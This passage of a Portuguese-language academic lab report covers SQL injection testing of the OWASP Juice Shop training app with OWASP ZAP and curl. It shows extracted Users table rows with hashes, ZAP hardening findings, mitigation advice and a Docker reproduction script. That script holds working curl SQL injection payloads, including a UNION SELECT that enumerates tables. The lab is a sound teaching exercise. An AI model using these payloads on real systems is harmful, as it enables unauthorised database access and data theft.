| name | `e541ca7ecf72b8d1286474fc613e5e45` |
| id | `bender@juice-sh.op` |
| name | `0c36e517e3fa95aabf1bbffc6744a4ef` |

Interpretação: a consulta manipulada permitiu projetar valores da tabela `Users` dentro do JSON originalmente destinado à busca de produtos. No contexto acadêmico, isso caracteriza demonstração controlada de exfiltração de dados via SQL Injection.

---

## 9. Achados complementares do OWASP ZAP

Além da SQL Injection, o ZAP apresentou alertas típicos de hardening de aplicação, tais como:

| Achado | Natureza | Impacto resumido |
|---|---|---|
| Content Security Policy Header Not Set | Configuração HTTP | Aumenta exposição a ataques de injeção de conteúdo e XSS |
| Missing Anti-clickjacking Header | Configuração HTTP | Pode permitir ataques de clickjacking |
| Cross-Domain Misconfiguration | Configuração HTTP/CORS | Pode ampliar superfície de interação indevida entre origens |
| Session ID in URL Rewrite | Sessão | Pode expor identificadores em histórico, logs e referers |
| Private IP Disclosure | Exposição de informação | Pode revelar detalhes internos do ambiente |
| X-Content-Type-Options Header Missing | Configuração HTTP | Pode permitir interpretação indevida de conteúdo |
| Modern Web Application | Informativo | Indica necessidade de spider dinâmico/AJAX |

---

## 10. Lições técnicas aprendidas

### 10.1. Sobre scanners de infraestrutura

Scanners como OpenVAS/Greenbone são essenciais para higiene de infraestrutura, porém não substituem testes DAST. Eles podem identificar falhas em serviços, versões e configurações, mas não necessariamente compreendem fluxos de aplicação, JavaScript, parâmetros dinâmicos e lógica de negócio.

### 10.2. Sobre scanners DAST

O OWASP ZAP mostrou-se mais adequado para o Juice Shop porque conseguiu interagir com a camada HTTP, descobrir o endpoint de busca e testar o parâmetro `q` com payloads voltados à aplicação.

### 10.3. Sobre validação manual

O alerta automatizado deve ser confirmado manualmente. O uso de `curl` permitiu:

- reproduzir erro HTTP 500;
- confirmar exposição de erro SQL;
- validar a possibilidade de `UNION SELECT`;
- demonstrar enumeração de tabelas;
- demonstrar acesso indevido a dados da tabela `Users` no ambiente controlado.

---

## 11. Recomendações de mitigação

### 11.1. Correções na aplicação

1. Substituir concatenação de strings SQL por **queries parametrizadas**.
2. Utilizar corretamente ORM ou query builder com binding de parâmetros.
3. Validar e normalizar entradas recebidas por parâmetros de busca.
4. Aplicar testes unitários e de integração para entradas maliciosas.
5. Impedir que erros técnicos sejam retornados ao cliente.

### 11.2. Correções na infraestrutura

1. Habilitar WAF em modo monitoramento e, depois, bloqueio controlado.
2. Aplicar cabeçalhos de segurança: CSP, HSTS, X-Frame-Options ou frame-ancestors, X-Content-Type-Options.
3. Restringir exposição de serviços administrativos.
4. Centralizar logs de aplicação e proxy.
5. Criar alertas para padrões de ataque como `UNION SELECT`, aspas anômalas e erros SQL recorrentes.

### 11.3. Correções operacionais

1. Integrar DAST ao pipeline de CI/CD em ambiente de homologação.
2. Registrar evidências de scan em relatórios versionados.
3. Manter política de autorização formal para testes.
4. Diferenciar claramente teste de infraestrutura, teste DAST e validação manual.
5. Revisar falsos positivos e falsos negativos antes de concluir o relatório.

---

## 12. Roteiro resumido para reprodução

```bash
# 1. Criar rede de laboratório
docker network create lab-dast

# 2. Subir Juice Shop
docker run -d --name juice-shop --network lab-dast -p 3000:3000 bkimminich/juice-shop

# 3. Subir OWASP ZAP com interface WebSwing
docker run -u zap -d --name zap --network lab-dast \
  -p 8080:8080 -p 8443:8443 \
  ghcr.io/zaproxy/zaproxy:full \
  zap-webswing.sh --webswing-disable-auth

# 4. Acessar ZAP
# http://<IP_DO_HOST>:8080/zap/

# 5. Configurar Automated Scan
# URL: http://juice-shop:3000 ou http://<IP_DO_HOST>:3000
# Spider tradicional: habilitado
# AJAX Spider: If Modern/habilitado
# Browser: Firefox

# 6. Validar alerta SQLi via curl
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')));"

# 7. Enumerar tabelas em ambiente controlado
curl -i -G "http://172.17.0.2:3000/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT name, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master WHERE type='table'-- "
```

---

## 13. Evidências a anexar ao relatório acadêmico

| Evidência | Descrição | Status |
|---|---|---|
| Print 01 | Tela do Quick Start / Automated Scan do ZAP | Anexado |
| Print 02 | Aba Alerts com SQL Injection | Anexado |
| Output 01 | `curl` com erro 500 e `SQLITE_ERROR` | Inserir no relatório final |
| Output 02 | `curl` com enumeração de tabelas | Inserir trecho relevante, sem excesso de dados |
| Output 03 | `curl` com projeção da tabela `Users` | Inserir apenas amostra acadêmica |
| Relatório ZAP | Exportação HTML/PDF do ZAP | Opcional |
| Logs Docker | `docker logs juice-shop` durante testes | Opcional |

---

## 14. Modelo de conclusão acadêmica

O laboratório demonstrou que a segurança de aplicações modernas exige abordagem em camadas. A análise de infraestrutura, embora indispensável, não foi suficiente para revelar vulnerabilidades de lógica presentes no OWASP Juice Shop. A utilização do OWASP ZAP, combinada com validação manual por `curl`, permitiu identificar e confirmar uma falha de SQL Injection no parâmetro `q` do endpoint `/rest/products/search`.

A exploração controlada permitiu comprovar erro SQL, enumeração de tabelas e projeção indevida de dados da tabela `Users`, reforçando a necessidade de parametrização de consultas, tratamento adequado de erros, hardening HTTP e integração de testes DAST no ciclo de desenvolvimento. Assim, conclui-se que OpenVAS/Greenbone e OWASP ZAP são ferramentas complementares, cada qual com finalidade própria, devendo ser empregadas de modo coordenado em programas maduros de segurança.

---

## 15. Checklist final do aluno

- [ ] Subiu o Juice Shop em Docker.
- [ ] Subiu o OWASP ZAP em Docker.
- [ ] Confirmou conectividade entre ZAP e alvo.
- [ ] Executou Automated Scan.
- [ ] Identificou alerta de SQL Injection.
- [ ] Validou o alerta com `curl`.
- [ ] Registrou evidência do erro `SQLITE_ERROR`.
- [ ] Enumerou tabelas do SQLite em ambiente controlado.
- [ ] Documentou os achados complementares de hardening.
- [ ] Redigiu conclusão técnica e recomendações.
- [ ] Anexou prints e outputs relevantes.

